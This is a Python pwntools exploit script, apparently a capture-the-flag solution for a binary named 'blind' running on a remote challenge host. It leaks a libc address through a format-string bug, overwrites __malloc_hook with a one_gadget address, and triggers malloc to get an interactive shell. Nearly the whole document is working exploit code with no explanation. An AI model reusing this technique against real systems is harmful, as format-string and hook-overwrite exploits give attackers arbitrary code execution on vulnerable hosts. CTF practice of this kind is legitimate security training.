#!/usr/bin/env python3

from pwn import *

context(os='linux', arch='amd64', log_level='error')
context.terminal = ['tmux', 'splitw', '-h']
exe = ELF("./blind")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")
context.binary = exe

#io = gdb.debug(exe.path, '', api=True)
#io = remote('127.0.0.1', 5000)
io = remote('pwn.1nf1n1ty.team', 32739)

# leak libc
io.sendlineafter(b'>>> ', b'--%7$s--'+p64(exe.got.printf))
io.recvuntil(b'--')
leak = io.recv(6)
libc.address = unpack(leak, 'all')-libc.sym.printf

# overwrite malloc hook
io.sendlineafter(b'>>> ', fmtstr_payload(offset=6, writes={
    libc.sym.__malloc_hook : libc.address+0x10a2fc
}))

# trigger malloc
io.sendlineafter(b'>>> ', b'%100000$c')
io.interactive()
